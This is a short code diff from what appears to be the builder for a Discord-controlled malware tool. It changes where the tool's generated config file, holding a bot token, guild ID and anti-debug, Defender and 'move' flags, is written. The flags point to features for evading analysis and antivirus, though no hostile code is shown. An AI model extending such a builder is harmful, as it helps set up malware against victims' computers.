@@ -36,7 +36,7 @@ def convert(value, name):
 def config(token, guild_id, interval, error, antidebug, defender, move):    
     config = f"TOKEN = '{token}'\nGUILD_ID = '{guild_id}'\nINTERVAL = {interval}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}\nMOVE = {move}"
     
-    with open("config.py", "w") as f:
+    with open("src\config.py", "w") as f:
         f.write(config)
 
 
